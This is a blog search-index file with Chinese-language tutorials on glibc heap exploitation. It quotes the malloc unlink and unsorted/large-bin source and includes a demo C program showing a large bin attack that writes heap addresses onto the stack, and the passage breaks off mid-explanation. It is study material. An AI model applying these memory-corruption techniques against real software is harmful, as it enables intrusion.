<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>house_of_apple</title>
    <link href="/2024/06/04/house-of-apple/"/>
    <url>/2024/06/04/house-of-apple/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>unlink_heap</title>
    <link href="/2024/05/05/unlink-heap/"/>
    <url>/2024/05/05/unlink-heap/</url>
    
    <content type="html"><![CDATA[<h1 id="关于unlink-heap"><a href="#关于unlink-heap" class="headerlink" title="关于unlink heap"></a>关于unlink heap</h1><p>unlink是一个libc中定义的宏操作，以下是关于它的源码（libc2.23）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span><br>    FD = P-&gt;fd;      <br>    BK = P-&gt;bk;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      <br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  <br>    <span class="hljs-keyword">else</span> &#123;      <br>        FD-&gt;bk = BK;      <br>        BK-&gt;fd = FD;      <br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (P-&gt;size)      <br>            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>)) &#123;      <br>    <span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      <br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    <br>      malloc_printerr (check_action,      <br>       <span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    <br>       P, AV);      <br>            <span class="hljs-keyword">if</span> (FD-&gt;fd_nextsize == <span class="hljs-literal">NULL</span>) &#123;      <br>                <span class="hljs-keyword">if</span> (P-&gt;fd_nextsize == P)      <br>                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      <br>                <span class="hljs-keyword">else</span> &#123;      <br>                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      <br>                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      <br>                  &#125;      <br>              &#125; <span class="hljs-keyword">else</span> &#123;      <br>                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      <br>                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      <br>              &#125;      <br>          &#125;      <br>      &#125;      <br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>攻击效果：</strong>将一个chunk从其bin链表中摘除</p><p>可以理解为将：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/Screenshot_20240603_195822.jpg" alt="img"></p><p>变为：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/Screenshot_20240603_195933.jpg" alt="img"></p><p>即：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk2_fd = chunk1_prev_addr<br>chunk2_bk = chunk3_prev_addr<br>chunk1_bk = chunk3_prev_addr <br>chunk3_fd = chunk1_prev_addr <br></code></pre></td></tr></table></figure><h3 id="chunk状态检查"><a href="#chunk状态检查" class="headerlink" title="chunk状态检查"></a>chunk状态检查</h3><p>原作者：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889">好好说话之unlink-CSDN博客</a></p><p>Linux执行一些代码前会对chunk进行一些检查，以下三点就是检查chunk是否空闲的三大标准。</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240603201052940.png" alt="image-20240603201052940"></p><ul><li><p>检查1：检查与被释放chunk相邻高地址的chunk的prevsize的值是否等于被释放chunk的size大小</p></li><li><p>检查2：检查与被释放chunk相邻高地址的chunk的size的P标志位是否为0</p></li><li><p>检查3：检查前后被释放chunk的fd和bk</p></li></ul><p>具体利用可以看：<a href="https://blog.csdn.net/qq_41202237/article/details/108481889">好好说话之unlink-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>large_bin_attack</title>
    <link href="/2024/05/05/large-bin-attack/"/>
    <url>/2024/05/05/large-bin-attack/</url>
    
    <content type="html"><![CDATA[<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><p>攻击效果：可以向任意的地址写入堆的地址</p><p>使用前提：存在UAF可以修改其data域</p><h3 id="large-bin介绍："><a href="#large-bin介绍：" class="headerlink" title="large bin介绍："></a>large bin介绍：</h3><p>large bin中一共包含了63个bin链表，每个bin的差值应该为0x10(64位情况下)。并且<strong>63个bin被分为了6组</strong>。</p><p>大于512（1024）字节的chunk会被分类到large chunk，而large bin就是为了管理这些chunk，每一个large chunk除了prev_size,size,fd,bk之外，还加入了fd_nextsize和bk_nextsize(关于这些可以看堆基础)</p><p>源码分析（参考了先知社区的文章）</p><p>malloc六个堆块，实际大小为0x400，0x410，0x420，0x430，然后我们依次free可以得到下面这幅图</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240528222317181.png" alt="image-20240528222317181"></p><ul><li>可以看出是从大到小排序（最小的fd为bin，最大的bk为bin）</li><li>大小相同的由fd与bk相连接，并且按照free的时间排序</li><li>各大小不同的第一个被free的堆块通过fd_nextsize与bk_nextsize相连接(也就是每个堆块的fd_nextsize与bk_nextsize会指向与自己大小不同的第一个堆块)</li><li>最大的chunk的bk_nextsize会指向最小的chunk，最小的chunk的fd_nextsize会指向最大的chunk</li></ul><p>以下为处理unsorted bin中chunk的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>&#123;<br>    bck = victim-&gt;bk;<br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>        || __builtin_expect (chunksize_nomask (victim)<br>                   &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>            malloc_printerr (check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                             chunk2mem (victim), av);<br>    size = chunksize (victim);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">      only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">      runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">      exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">      no exact fit for a small chunk.</span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>        bck == unsorted_chunks (av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>    &#123;<br>        <span class="hljs-comment">/* split and reattach remainder */</span><br>        remainder_size = size - nb;<br>        remainder = chunk_at_offset (victim, nb);<br>        unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>        av-&gt;last_remainder = remainder;<br>        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>        <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>        &#123;<br>            remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>            remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>        &#125;<br><br>        set_head (victim, nb | PREV_INUSE |<br>                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        set_head (remainder, remainder_size | PREV_INUSE);<br>        set_foot (remainder, remainder_size);<br><br>        check_malloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-comment">/* remove from unsorted list */</span><br>    unsorted_chunks (av)-&gt;bk = bck;<br>    bck-&gt;fd = unsorted_chunks (av);<br><br>    <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>    <span class="hljs-keyword">if</span> (size == nb)<br>    &#123;<br>         set_inuse_bit_at_offset (victim, size);<br>         <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>             set_non_main_arena (victim);<br>         check_malloced_chunk (av, victim, nb);<br>         <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>    <span class="hljs-comment">/* place chunk in bin */</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>    &#123;<br>        victim_index = smallbin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        victim_index = largebin_index (size);<br>        bck = bin_at (av, victim_index);<br>        fwd = bck-&gt;fd;<br><br>        <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>        <span class="hljs-keyword">if</span> (fwd != bck)<br>        &#123;<br>             <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>             size |= PREV_INUSE;<br>             <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>             assert (chunk_main_arena (bck-&gt;bk));<br>             <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>             &#123;<br>                 fwd = bck;<br>                 bck = bck-&gt;bk;<br>                 victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                 victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                 fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>              &#125;<br>              <span class="hljs-keyword">else</span><br>              &#123;<br>                  assert (chunk_main_arena (fwd));<br>                  <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))<br>                  &#123;<br>                      fwd = fwd-&gt;fd_nextsize;<br>                      assert (chunk_main_arena (fwd));<br>                  &#125;<br><br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                  <span class="hljs-keyword">else</span><br>                  &#123;<br>                      victim-&gt;fd_nextsize = fwd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                      fwd-&gt;bk_nextsize = victim;<br>                      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                  bck = fwd-&gt;bk;<br>              &#125;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>    &#125;<br><br>    mark_bin (av, victim_index);<br>    victim-&gt;bk = bck;<br>    victim-&gt;fd = fwd;<br>    fwd-&gt;bk = victim;<br>    bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>在这个循环中，每次的迭代会检索当前unsorted bin中的最后一个chunk，如果最后一个chunk为（av）那么则退出循环。</p><p>接下来就会按照如下步骤对这个最后一个chunk进行操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>        bck == unsorted_chunks (av) &amp;&amp; <span class="hljs-comment">//检查为unsorted中最后一个chunk</span><br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br></code></pre></td></tr></table></figure><p>如果堆块是unsorted bin中的最后一个chunk，检索到的chunk的大小适合所请求的chunk，检索到的块是last remainder并且请求的字节小于<em>MIN_LARGE_SIZE</em>，，检索到的chunk将被分割成所请求大小的chunk和剩余chunk。请求大小的chunk将返回给用户，剩余的chunk将再次插入unsorted bin中</p><p>接下来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (size == nb)<br></code></pre></td></tr></table></figure><p>如果被free的堆块的大小等于请求的大小，则直接返回块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (size))<br></code></pre></td></tr></table></figure><p>如果被free的堆块的大小在small bin的范围内，则获取相应的small bin的index，并将块插入small bin；如果以上条件都不满足，则认为其在large bin大小范围，进入chunk插入large bin的步骤。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fwd != bck)<br>&#123;<br>   ~~~~~~~~~~~~       <br>&#125;<br><span class="hljs-keyword">else</span><br>    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br></code></pre></td></tr></table></figure><p>首先判断large bin是否为空，为空的话，直接将 chunk 的 fd_nextsize bk_nextsize 设置为自身</p><p>不为空则进行下一步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (bck-&gt;bk))<br>&#123;<br>    fwd = bck;<br>    bck = bck-&gt;bk;<br>    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果被free的堆块的大小小于large bin中最后一个块的大小，我们将被free的堆块作为最后一个块插入large bin中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>&#123;<br>    assert (chunk_main_arena (fwd));<br>    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; chunksize_nomask (fwd))<br>    &#123;<br>        fwd = fwd-&gt;fd_nextsize;<br>        assert (chunk_main_arena (fwd));<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>        fwd = fwd-&gt;fd;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        victim-&gt;fd_nextsize = fwd;<br>        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>        fwd-&gt;bk_nextsize = victim;<br>        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>    &#125;<br>    bck = fwd-&gt;bk;<br>&#125;<br></code></pre></td></tr></table></figure><p>否则，我们从链表头部开始遍历，直到找到第一个 size 大于等于待插入 chunk 的链表，找到后判断链表的 size 是否等于待插入chunk的size，如果相等，直接将这个 chunk 插入到当前链表的第二个位置，如果不相等，说明待插入的chunk比当前链表头结点的 size 大，那么我们将待插入的chunk作为当前链表的头结点，插入到符合size的bin index后。</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><p>接下来通过一段代码，来更好的对large bin attack有更好的了解。（源自：<a href="https://blog.csdn.net/qq_41202237/article/details/112825556">好好说话之Large Bin Attack_largebin attack-CSDN博客</a>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc -g -no-pie hollk.c -o hollk</span><br>  <span class="hljs-number">2</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>  <span class="hljs-number">3</span> <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br>  <span class="hljs-number">4</span> <br>  <span class="hljs-number">5</span> <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>  6 &#123;<br>  <span class="hljs-number">7</span> <br>  <span class="hljs-number">8</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>  <span class="hljs-number">9</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br> <span class="hljs-number">10</span> <br> <span class="hljs-number">11</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br> <span class="hljs-number">12</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br> <span class="hljs-number">13</span> <br> <span class="hljs-number">14</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br> <span class="hljs-number">15</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">16</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br> <span class="hljs-number">17</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">18</span>     <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br> <span class="hljs-number">19</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <span class="hljs-number">20</span> <br> <span class="hljs-number">21</span>     <span class="hljs-built_in">free</span>(p1);<br> <span class="hljs-number">22</span>     <span class="hljs-built_in">free</span>(p2);<br> <span class="hljs-number">23</span> <br> <span class="hljs-number">24</span>     <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <span class="hljs-number">25</span> <br> <span class="hljs-number">26</span>     <span class="hljs-built_in">free</span>(p3);<br> <span class="hljs-number">27</span> <br> <span class="hljs-number">28</span>     p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;<br> <span class="hljs-number">29</span>     p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br> <span class="hljs-number">30</span>     p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br> <span class="hljs-number">31</span>     p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);<br> <span class="hljs-number">32</span>     p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<br> <span class="hljs-number">33</span> <br> <span class="hljs-number">34</span>     <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br> <span class="hljs-number">35</span> <br> <span class="hljs-number">36</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-number">37</span>     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <span class="hljs-number">38</span> <br> <span class="hljs-number">39</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <span class="hljs-number">40</span> &#125;<br></code></pre></td></tr></table></figure><h4 id="1-在21行打上断点，让对应的堆块完成创建"><a href="#1-在21行打上断点，让对应的堆块完成创建" class="headerlink" title="1.在21行打上断点，让对应的堆块完成创建"></a>1.在21行打上断点，让对应的堆块完成创建</h4><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531114543681.png" alt="image-20240531114543681"></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/Screenshot_20240531_203032.jpg" alt="Screenshot_20240531_203032"></p><h4 id="2-接下来程序运行到24行"><a href="#2-接下来程序运行到24行" class="headerlink" title="2.接下来程序运行到24行"></a>2.接下来程序运行到24行</h4><p>释放了p1和p2，由于P1的size为0x330，P2的size为0x410，两个chunk的size均超过了fast chunk的最大值，所以在释放P1、P2的时候，两个chunk均进入unsortbin链表中。这里还可以细分，由于P1的size<strong>小于0x3F0</strong>，所以<strong>P1最终应该归属为small bin中</strong>。P2大于0x3F0，所以<strong>P2最终应该归属为large bin中</strong>。</p><h4 id="3-程序运行到26行"><a href="#3-程序运行到26行" class="headerlink" title="3.程序运行到26行"></a>3.程序运行到26行</h4><p>申请了一个0x90大小的chunk也就是p4先看程序的结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531150618227.png" alt="image-20240531150618227"></p><ul><li><p>从unsorted bin中拿出最后一个chunk(P1)</p></li><li><p>把这个chunk(P1)放进small bin中，并标记这个small bin中有空闲的chunk</p></li><li><p>从unsorted bin中拿出最后一个chunk(P2)（P1被拿走之后P2就作为最后一个chunk了）</p></li><li><p>把这个chunk(P2)放进large bin中，并标记这个large bin有空先的chunk</p></li><li><p>现在unsorted bin中为空，从small bin中的P1中分割出一个小chunk，满足请求的P4，并把剩下的chunk(0x330 - 0xa0后记P1_left)放回unsorted bin中</p></li><li><p><strong>因为从最开始的源码可以看出，只要进行了申请就会对unsorted bin进行循环遍历，将unsorted中的chunk进行分类</strong></p></li></ul><h4 id="4-程序运行到28行，释放p3："><a href="#4-程序运行到28行，释放p3：" class="headerlink" title="4.程序运行到28行，释放p3："></a>4.程序运行到28行，释放p3：</h4><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531151146045.png" alt="image-20240531151146045"></p><p>由于p3的size大于0x3F0，故而也会先放入unsorted bin</p><h4 id="5-修改p2的内容"><a href="#5-修改p2的内容" class="headerlink" title="5.修改p2的内容"></a>5.修改p2的内容</h4><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531151352583.png" alt="image-20240531151352583"></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/Screenshot_20240531_205027.jpg" alt="Screenshot_20240531_205027"></p><h4 id="6-程序运行到36行执行malloc-0x90"><a href="#6-程序运行到36行执行malloc-0x90" class="headerlink" title="6.程序运行到36行执行malloc(0x90);"></a>6.程序运行到36行执行malloc(0x90);</h4><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531155257989.png" alt="image-20240531155257989"></p><p>与第一次分割chunk的过程一致，首先从unsorted bin中拿出最后一个chunk(P1_left size &#x3D; 0x290)，并放入small bin中标记该序列的small bin有空闲chunk。再从unsorted bin中拿出最后一个chunk(P3 size &#x3D; 0x410)，P3的size是大于0x3f0的，所以理所应当应该向large bin中挂，而上面的代码就是代表着要将当前释放的large chunk具体放到链表的哪个位置。</p><p>首先看到源码第一个if，把当前检索到的chunk size与链表中的比较（也就是比较p3与p2的大小）可以看到源码在循环的检索large bin中的每一个chunk与当前释放的chunk比较，只有当前chunk不小于large bin中的那个chunk才停止循环；然后进入第二个比较也就是查看是否等于已经检索到的那个large 